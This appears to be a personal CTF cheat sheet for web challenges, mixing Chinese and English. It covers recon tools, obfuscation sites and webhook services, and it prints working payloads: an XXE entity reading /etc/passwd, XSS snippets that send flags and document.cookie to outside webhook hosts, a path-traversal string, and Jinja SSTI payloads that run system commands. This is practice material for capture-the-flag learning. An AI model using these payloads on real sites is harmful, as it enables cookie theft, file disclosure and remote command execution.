---
title: Web Cheat Sheet
tags: [Tools, CTF, Web]

category: "Tools｜CTF"
date: 2024-02-07
---

# Web Cheat Sheet
## 解題重點
* `robots.txt`
* 掃port: nmap: `$ sudo apt install net-tools`[NMAP教學](https://blog.gtwang.org/linux/nmap-command-examples-tutorials/)
    * nmap: `$ nmap <url>`
* 封包headers和contents: Wireshark、Browser、BurpSuite
* cookies
* Information Leak
    * `.DS_Store`: lijiejie/ds_store_exp
    * `gitleak`: denny0223/scrabble

### [All-Injection:](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%19Injection/README.md)
* SQLi
    * [SQLMAP1](https://ithelp.ithome.com.tw/articles/10249487)
    * [SQLMAP2](https://ithelp.ithome.com.tw/articles/10202811)
* XXE
    ```html
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <data><ID>&xxe;</ID></data>
    ```
* [XSS-CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
    ```javascript
    </script><script>
    fetch(`/getflag\)
        .then(r=>r.text())
        .then(flag=>location.href=`https://sbk6401.free.beeceptor.com/?f=${flag}`
        )
    </script>
    ```
* [Command Injection - feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)

### 其他
* LFI: `../../../flag.txt`
* Deserialization
* 前端
* SSRF
* 上傳
* 如果是WordPress網頁: [WpScan](https://wpscan.com/)專門檢測WordPress類型的網頁，有哪些漏洞，前期可以掃描出WP版本、安裝的theme或是插件有哪些、安全漏洞等等
<!-- more -->

## Online Tools

| Fuck                             | Beautifier                       |
| -------------------------------- | -------------------------------- |
| [jsfuck](http://www.jsfuck.com/)<br>[JS 混淆器](https://obfuscator.io/)| 把JS的程式變成可讀性很差的東西 | [JSNice](http://www.jsnice.org/) |
|[jjencode](https://utf-8.jp/public/jjencode.html)|[JS 反混淆器](https://beautifier.io/): 可以反混淆或解密JS的檔案|
|[aaencode](https://utf-8.jp/public/aaencode.html)|[JS 壓縮+加密+混淆+美化](https://js.wfuapp.com/)|
|[Esolang List](https://esolangs.org/wiki/Language_list)|[JS Fuck Decode](https://www.53lu.com/tool/jsfuckdecode/)|
||[aadecode](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html)|

## Cheat-Sheet
{% raw %}
* [XSS-CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
    利用XSS把session打到webhook上: 
    ```javascript?
    window.location=<requestbin.com>/?a+document.cookie
    // or
    fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GET', headers: { 'Cookie': document.cookie } })
    ```
* [All-Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%19Injection/README.md)
* SSTI Payload: 記得找<span style="background-color: yellow">os.\_wrap_close</span>
    ```
    {{().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id')}}
    {{self.__init__.__globals__.__builtins__.__import__("os").popen("cat%20Flag.txt").read()}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt")}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']("cat /flag.txt")}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower())}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}}
    ```
    {% endraw %}

## Others
* wasm → c: [wabt](https://github.com/WebAssembly/wabt)
    ```bash!
    # 安裝Cmake，所有過程一定要用WSL
    $ mkdir build && cd build
    $ cmake ..
    $ cmake --build .
    # 按照說明build完後進到./build
    $ ./wasm2c {wasm file path} -o {output c file path}
    ```
* Webhook
    [Webhook.site](https://webhook.site/)
    [Beeceptor](https://beeceptor.com/)
    [Ngrok](https://ngrok.com/)